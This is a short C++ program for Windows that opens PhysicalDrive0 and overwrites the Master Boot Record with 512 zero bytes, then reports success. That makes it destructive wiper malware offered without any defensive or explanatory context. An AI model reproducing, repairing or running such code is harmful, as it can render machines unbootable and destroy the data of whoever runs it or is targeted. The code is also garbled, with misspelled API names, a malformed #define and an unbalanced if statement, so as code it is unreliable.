#include <iostream>
#include <Windows.h>

using namespace std;
#define MBR_SIZE[512]
int main()
{
	DWORD write ;
	char mbrData[MBR_SIZE];
	ZeroMomery(&mbrData, (sizeof mbrData));
	
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhisicalDrive0", GENRIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)) == true 
	{
		cout<<"Master Boot Record is over written!"<<endl;
                sleep(5000);
                ExitProcess(0);
	}
	else
	{
		cout<<"Fail"<<endl;
		sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;
}
